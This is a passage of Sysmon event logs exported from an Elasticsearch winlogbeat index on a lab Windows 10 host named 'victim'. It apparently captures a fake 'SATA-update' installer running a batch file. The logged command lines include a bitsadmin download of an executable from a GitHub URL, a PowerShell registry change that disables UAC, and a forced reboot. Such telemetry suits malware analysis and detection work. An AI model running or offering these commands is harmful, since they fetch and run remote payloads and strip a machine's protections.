"Oct 23, 2022 @ 01:41:15.892",VUXJAIQBHC0TB3lJ65cn,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","22391c00-748c-4308-b3a3-5a7add9445bd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:41:17.853","Oct 23, 2022 @ 01:42:23.782",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:41:15.892
ProcessGuid: {461f0bd2-2b3b-6354-f202-000000001d00}
ProcessId: 8164
Image: C:\Windows\System32\wlrmdr.exe
FileVersion: 10.0.19041.746 (WinBuild.160101.0800)
Description: Windows logon reminder
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: WLRMNDR.EXE
CommandLine: -s -1 -f 2 -t You're about to be signed out -m Windows will shut down in less than a minute. -a 3
CurrentDirectory: C:\Windows\system32\
User: VICTIM\Patricia Goh
LogonGuid: {461f0bd2-06a8-6354-36c5-050000000000}
LogonId: 0x5C536
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=EF9BBA7A637A11B224A90BF90A8943AC,SHA256=2FDA95AAFB2E9284C730BF912B93F60A75B151941ADC14445ED1E056140325B1,IMPHASH=0C029EF03BE0DFE4324558843609A28E
ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
ParentProcessId: 600
ParentImage: -
ParentCommandLine: -
ParentUser: -","-","-","-","-","-","-","-","-","-","-","-","-","-s, -1, -f, 2, -t, You're, about, to, be, signed, out, -m, Windows, will, shut, down, in, less, than, a, minute., -a, 3",23,"-s -1 -f 2 -t You're about to be signed out -m Windows will shut down in less than a minute. -a 3","-s -1 -f 2 -t You're about to be signed out -m Windows will shut down in less than a minute. -a 3","{461f0bd2-2b3b-6354-f202-000000001d00}","C:\Windows\System32\wlrmdr.exe","C:\Windows\System32\wlrmdr.exe",ef9bba7a637a11b224a90bf90a8943ac,2fda95aafb2e9284c730bf912b93f60a75b151941adc14445ed1e056140325b1,"wlrmdr.exe","wlrmdr.exe","-",1,"-","-","{00000000-0000-0000-0000-000000000000}","-","-","-","-",600,"Microsoft Corporation","Windows logon reminder","10.0.19041.746 (WinBuild.160101.0800)",0c029ef03be0dfe4324558843609a28e,"WLRMNDR.EXE","Microsoft® Windows® Operating System",8164,"-","-","C:\Windows\system32\","C:\Windows\system32\","-","-","-","-","-","-","2fda95aafb2e9284c730bf912b93f60a75b151941adc14445ed1e056140325b1, ef9bba7a637a11b224a90bf90a8943ac, 0c029ef03be0dfe4324558843609a28e","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","Windows logon reminder","-","10.0.19041.746 (WinBuild.160101.0800)",High,"{461f0bd2-06a8-6354-36c5-050000000000}",0x5c536,"-","-","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",1,"-",1,"-","-",Info,"2,316","4,084","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",4641,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:41:15.760",VEXJAIQBHC0TB3lJ65cn,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","22391c00-748c-4308-b3a3-5a7add9445bd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:41:17.853","Oct 23, 2022 @ 01:42:23.780",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:41:15.760
ProcessGuid: {461f0bd2-2b3b-6354-f102-000000001d00}
ProcessId: 6336
Image: C:\Windows\System32\shutdown.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Windows Shutdown and Annotation Tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: SHUTDOWN.EXE
CommandLine: shutdown  -r -t 1
CurrentDirectory: C:\
User: VICTIM\Patricia Goh
LogonGuid: {461f0bd2-06a8-6354-36c5-050000000000}
LogonId: 0x5C536
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=F2A4E18DA72BB2C5B21076A5DE382A20,SHA256=D4E68CC9CB1965D70134C68BD1A090E0AFAE5B8B3D8018C6B6564852AE7BF396,IMPHASH=7381EF144DB2B1CFEA7EEF9BB9B7A530
ParentProcessGuid: {461f0bd2-2b2d-6354-e802-000000001d00}
ParentProcessId: 8868
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" 
ParentUser: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","shutdown, -r, -t, 1",4,"shutdown  -r -t 1","shutdown  -r -t 1","{461f0bd2-2b3b-6354-f102-000000001d00}","C:\Windows\System32\shutdown.exe","C:\Windows\System32\shutdown.exe",f2a4e18da72bb2c5b21076a5de382a20,d4e68cc9cb1965d70134c68bd1a090e0afae5b8b3d8018c6b6564852ae7bf396,"shutdown.exe","shutdown.exe","C:\Windows\Sysnative\cmd.exe, /C, C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat, C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe",4,"""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" ","""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" ","{461f0bd2-2b2d-6354-e802-000000001d00}","C:\Windows\System32\cmd.exe","C:\Windows\System32\cmd.exe","cmd.exe","cmd.exe",8868,"Microsoft Corporation","Windows Shutdown and Annotation Tool","10.0.19041.1 (WinBuild.160101.0800)",7381ef144db2b1cfea7eef9bb9b7a530,"SHUTDOWN.EXE","Microsoft® Windows® Operating System",6336,"-","-","C:\","C:\","-","-","-","-","-","-","d4e68cc9cb1965d70134c68bd1a090e0afae5b8b3d8018c6b6564852ae7bf396, f2a4e18da72bb2c5b21076a5de382a20, 7381ef144db2b1cfea7eef9bb9b7a530","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","Windows Shutdown and Annotation Tool","-","10.0.19041.1 (WinBuild.160101.0800)",High,"{461f0bd2-06a8-6354-36c5-050000000000}",0x5c536,"-","VICTIM\Patricia Goh","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",1,"-",1,"-","-",Info,"2,316","4,084","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",4640,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:41:14.746",UkXJAIQBHC0TB3lJ4pdJ,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","22391c00-748c-4308-b3a3-5a7add9445bd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:41:16.041","Oct 23, 2022 @ 01:42:21.513",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:41:14.746
ProcessGuid: {461f0bd2-2b3a-6354-f002-000000001d00}
ProcessId: 9096
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: bitsadmin  /transfer Installation  /download /priority foreground https://raw.githubusercontent.com/Percin0/Perci_Bat/main/Percino.exe C:\Windows.old\Percino.exe
CurrentDirectory: C:\
User: VICTIM\Patricia Goh
LogonGuid: {461f0bd2-06a8-6354-36c5-050000000000}
LogonId: 0x5C536
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {461f0bd2-2b2d-6354-e802-000000001d00}
ParentProcessId: 8868
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" 
ParentUser: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","bitsadmin, /transfer, Installation, /download, /priority, foreground, https://raw.githubusercontent.com/Percin0/Perci_Bat/main/Percino.exe, C:\Windows.old\Percino.exe",8,"bitsadmin  /transfer Installation  /download /priority foreground https://raw.githubusercontent.com/Percin0/Perci_Bat/main/Percino.exe C:\Windows.old\Percino.exe","bitsadmin  /transfer Installation  /download /priority foreground https://raw.githubusercontent.com/Percin0/Perci_Bat/main/Percino.exe C:\Windows.old\Percino.exe","{461f0bd2-2b3a-6354-f002-000000001d00}","C:\Windows\System32\bitsadmin.exe","C:\Windows\System32\bitsadmin.exe",01aab62d5799f75b0d69eb29c1ca6855,739b2dd012ea183895cc01116906f339c9aa1c0baabf6f22c8e59e25a0c12917,"bitsadmin.exe","bitsadmin.exe","C:\Windows\Sysnative\cmd.exe, /C, C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat, C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe",4,"""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" ","""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" ","{461f0bd2-2b2d-6354-e802-000000001d00}","C:\Windows\System32\cmd.exe","C:\Windows\System32\cmd.exe","cmd.exe","cmd.exe",8868,"Microsoft Corporation","BITS administration utility","7.8.19041.1 (WinBuild.160101.0800)",774033454eb79213b09f788fc004a02d,"bitsadmin.exe","Microsoft® Windows® Operating System",9096,"-","-","C:\","C:\","-","-","-","-","-","-","739b2dd012ea183895cc01116906f339c9aa1c0baabf6f22c8e59e25a0c12917, 01aab62d5799f75b0d69eb29c1ca6855, 774033454eb79213b09f788fc004a02d","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","BITS administration utility","-","7.8.19041.1 (WinBuild.160101.0800)",High,"{461f0bd2-06a8-6354-36c5-050000000000}",0x5c536,"-","VICTIM\Patricia Goh","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",1,"-",1,"-","-",Info,"2,316","4,084","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",4639,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:41:14.096",UEXJAIQBHC0TB3lJ4pdJ,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","22391c00-748c-4308-b3a3-5a7add9445bd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","File created (rule: FileCreate)",file,11,"Oct 23, 2022 @ 01:41:16.039","Oct 23, 2022 @ 01:42:21.512",event,sysmon,"-","Microsoft-Windows-Sysmon","-",creation,"C:\Users\Patricia Goh\AppData\Local\Temp",ps1,"__PSScriptPolicyTest_osfx5me2.4m5.ps1","C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_osfx5me2.4m5.ps1","C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_osfx5me2.4m5.ps1","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"File created:
RuleName: -
UtcTime: 2022-10-22 17:41:14.096
ProcessGuid: {461f0bd2-2b35-6354-ef02-000000001d00}
ProcessId: 6108
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_osfx5me2.4m5.ps1
CreationUtcTime: 2022-10-22 17:41:14.096
User: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{461f0bd2-2b35-6354-ef02-000000001d00}","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","-","powershell.exe","powershell.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",6108,"-","-","-","-","-","-","-","-","-","-","-","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"-","2022-10-22 17:41:14.096","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",11,"-","-",Info,"2,316","4,084","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",4637,"File created (rule: FileCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,2
"Oct 23, 2022 @ 01:41:10.244",R0XJAIQBHC0TB3lJ05fs,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","22391c00-748c-4308-b3a3-5a7add9445bd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","File created (rule: FileCreate)",file,11,"Oct 23, 2022 @ 01:41:11.750","Oct 23, 2022 @ 01:42:17.835",event,sysmon,"-","Microsoft-Windows-Sysmon","-",creation,"C:\Users\Patricia Goh\AppData\Local\Temp",ps1,"__PSScriptPolicyTest_12ekwj0h.frj.ps1","C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_12ekwj0h.frj.ps1","C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_12ekwj0h.frj.ps1","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"File created:
RuleName: -
UtcTime: 2022-10-22 17:41:10.244
ProcessGuid: {461f0bd2-2b35-6354-ef02-000000001d00}
ProcessId: 6108
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_12ekwj0h.frj.ps1
CreationUtcTime: 2022-10-22 17:41:10.244
User: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{461f0bd2-2b35-6354-ef02-000000001d00}","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","-","powershell.exe","powershell.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",6108,"-","-","-","-","-","-","-","-","-","-","-","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"-","2022-10-22 17:41:10.244","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",11,"-","-",Info,"2,316","4,084","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",4636,"File created (rule: FileCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,2
"Oct 23, 2022 @ 01:41:09.868",RkXJAIQBHC0TB3lJ05fs,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","22391c00-748c-4308-b3a3-5a7add9445bd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:41:11.750","Oct 23, 2022 @ 01:42:17.834",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:41:09.868
ProcessGuid: {461f0bd2-2b35-6354-ef02-000000001d00}
ProcessId: 6108
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.546 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe  New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
CurrentDirectory: C:\
User: VICTIM\Patricia Goh
LogonGuid: {461f0bd2-06a8-6354-36c5-050000000000}
LogonId: 0x5C536
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7
ParentProcessGuid: {461f0bd2-2b2d-6354-e802-000000001d00}
ParentProcessId: 8868
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" 
ParentUser: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","powershell.exe, New-ItemProperty, -Path, HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system, -Name, EnableLUA, -PropertyType, DWord, -Value, 0, -Force",11,"powershell.exe  New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force","powershell.exe  New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force","{461f0bd2-2b35-6354-ef02-000000001d00}","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",04029e121a0cfa5991749937dd22a1d9,9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f,"powershell.exe","powershell.exe","C:\Windows\Sysnative\cmd.exe, /C, C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat, C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe",4,"""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" ","""C:\Windows\Sysnative\cmd.exe""  /C C:\Users\PATRIC~1\AppData\Local\Temp\wxy\t20704.bat ""C:\Users\Patricia Goh\Downloads\SATA-update-14.1.0.exe"" ","{461f0bd2-2b2d-6354-e802-000000001d00}","C:\Windows\System32\cmd.exe","C:\Windows\System32\cmd.exe","cmd.exe","cmd.exe",8868,"Microsoft Corporation","Windows PowerShell","10.0.19041.546 (WinBuild.160101.0800)",7c955a0abc747f57ccc4324480737ef7,"PowerShell.EXE","Microsoft® Windows® Operating System",6108,"-","-","C:\","C:\","-","-","-","-","-","-","9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f, 04029e121a0cfa5991749937dd22a1d9, 7c955a0abc747f57ccc4324480737ef7","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","Windows PowerShell","-","10.0.19041.546 (WinBuild.160101.0800)",High,"{461f0bd2-06a8-6354-36c5-050000000000}",0x5c536,"-","VICTIM\Patricia Goh","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",1,"-",1,"-","-",Info,"2,316","4,084","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",4635,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:41:09.780",RUXJAIQBHC0TB3lJ05fs,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","22391c00-748c-4308-b3a3-5a7add9445bd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","File created (rule: FileCreate)",file,11,"Oct 23, 2022 @ 01:41:11.750","Oct 23, 2022 @ 01:42:17.833",event,sysmon,"-","Microsoft-Windows-Sysmon","-",creation,"C:\Users\Patricia Goh\AppData\Local\Microsoft\CLR_v4.0\UsageLogs",log,"powershell.exe.log","C:\Users\Patricia Goh\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\powershell.exe.log","C:\Users\Patricia Goh\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\powershell.exe.log","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"File created:
RuleName: ProcessHostingdotNETCode
UtcTime: 2022-10-22 17:41:09.780
ProcessGuid: {461f0bd2-2b2d-6354-ee02-000000001d00}
ProcessId: 8696
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Patricia Goh\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\powershell.exe.log
CreationUtcTime: 2022-10-22 17:41:09.780
User: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{461f0bd2-2b2d-6354-ee02-000000001d00}","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","-","powershell.exe","powershell.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",8696,"-","-","-","-","-","-","-","-","-","-","-","-","-","Patricia Goh",ProcessHostingdotNETCode,"-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"-","2022-10-22 17:41:09.780","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",11,"-","-",Info,"2,316","4,084","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",4634,"File created (rule: FileCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,2
"Oct 23, 2022 @ 01:41:06.553",Q0XJAIQBHC0TB3lJx5dW,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","22391c00-748c-4308-b3a3-5a7add9445bd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","File created (rule: FileCreate)",file,11,"Oct 23, 2022 @ 01:41:08.615","Oct 23, 2022 @ 01:42:14.613",event,sysmon,"-","Microsoft-Windows-Sysmon","-",creation,"C:\Users\Patricia Goh\AppData\Local\Temp",ps1,"__PSScriptPolicyTest_xz0sbrte.xl5.ps1","C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_xz0sbrte.xl5.ps1","C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_xz0sbrte.xl5.ps1","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"File created:
RuleName: -
UtcTime: 2022-10-22 17:41:06.553
ProcessGuid: {461f0bd2-2b2d-6354-ee02-000000001d00}
ProcessId: 8696
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_xz0sbrte.xl5.ps1
CreationUtcTime: 2022-10-22 17:41:06.553
User: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{461f0bd2-2b2d-6354-ee02-000000001d00}","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","-","powershell.exe","powershell.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",8696,"-","-","-","-","-","-","-","-","-","-","-","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"-","2022-10-22 17:41:06.553","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",11,"-","-",Info,"2,316","4,084","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",4633,"File created (rule: FileCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,2
"Oct 23, 2022 @ 01:41:02.586",O0XJAIQBHC0TB3lJr5d7,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","22391c00-748c-4308-b3a3-5a7add9445bd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","File created (rule: FileCreate)",file,11,"Oct 23, 2022 @ 01:41:03.557","Oct 23, 2022 @ 01:42:08.507",event,sysmon,"-","Microsoft-Windows-Sysmon","-",creation,"C:\Users\Patricia Goh\AppData\Local\Temp",ps1,"__PSScriptPolicyTest_ociajnh4.xq3.ps1","C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_ociajnh4.xq3.ps1","C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_ociajnh4.xq3.ps1","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"File created:
RuleName: -
UtcTime: 2022-10-22 17:41:02.586
ProcessGuid: {461f0bd2-2b2d-6354-ee02-000000001d00}
